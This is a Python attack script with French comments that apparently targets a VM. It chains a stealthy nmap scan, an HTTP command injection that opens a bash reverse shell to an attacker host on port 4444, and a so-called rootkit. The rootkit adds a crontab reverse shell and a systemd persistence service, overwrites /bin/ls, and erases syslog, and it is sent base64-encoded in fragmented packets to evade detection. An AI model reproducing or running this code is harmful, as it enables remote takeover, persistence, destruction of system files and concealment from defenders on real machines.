import scapy.all as scapy
import socket
import time
import random
import base64
import subprocess

# Configuration
target_ip = "<VM_IP>"  # Remplacer par l'IP de la VM
target_port = 80  # Port HTTP (ajuster selon le service détecté)
attacker_ip = "192.168.1.100"  # IP de l'attaquant
attacker_port = 4444

# Fonction 1 : Scan réseau furtif
def network_scan():
    print("Lancement du scan réseau...")
    subprocess.run(["nmap", "-sS", "-sV", "-p-", "--randomize-ports", "--source-ip", "192.168.1.254", target_ip], timeout=120)
    print("Scan terminé. Port cible identifié.")

# Fonction 2 : Exploitation via command injection
def command_injection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        # Payload pour un shell inversé
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + target_ip.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 100\r\n"
            b"\r\n"
            b"cmd=bash -c 'bash -i >& /dev/tcp/" + attacker_ip.encode() + b"/" + str(attacker_port).encode() + b" 0>&1'\r\n"
        )
        s.send(payload)
        response = s.recv(1024)
        print(f"Response: {response.decode(errors='ignore')}")
        s.close()
    except Exception as e:
        print(f"Erreur lors de l'injection: {e}")

# Fonction 3 : Installation du rootkit
def install_rootkit():
    try:
        # Payload rootkit : persistance, C2, infection de fichiers
        malicious_script = (
            "#!/bin/bash\n"
            f"echo '* * * * * root bash -c \"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\"' >> /etc/crontab\n"
            "echo '[Unit]\nDescription=Malicious\n[Service]\nExecStart=/tmp/malicious.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/malicious.service\n"
            "echo 'echo infected > /bin/ls' > /tmp/malicious.sh\n"
            "chmod +x /tmp/malicious.sh\n"
            "echo '' > /var/log/syslog\n"  # Effacer les logs
        ).encode()
        encoded_payload = base64.b64encode(malicious_script).decode()
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + target_ip.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(len(encoded_payload) + 10).encode() + b"\r\n"
            b"\r\n"
            b"cmd=echo " + encoded_payload.encode() + b" | base64 -d | bash\r\n"
        )
        # Envoyer via paquets fragmentés
        ip = scapy.IP(dst=target_ip, flags="MF", frag=0)
        tcp = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags="PA")
        fragments = scapy.fragment(ip / tcp / payload, fragsize=8)
        for frag in fragments:
            scapy.send(frag, verbose=0)
            time.sleep(0.03)
    except Exception as e:
        print(f"Erreur lors de l'installation du rootkit: {e}")

# Exécuter l'exploit
if __name__ == "__main__":
    print("Démarrage de l'exploit...")
    network_scan()
    print("Tentative d'injection de commande...")
    command_injection()
    print("Installation du rootkit...")
    for _ in range(5):  # Répéter pour simuler persistance
        install_rootkit()
        time.sleep(random.uniform(0.1, 0.4))
    print("Exploit terminé.")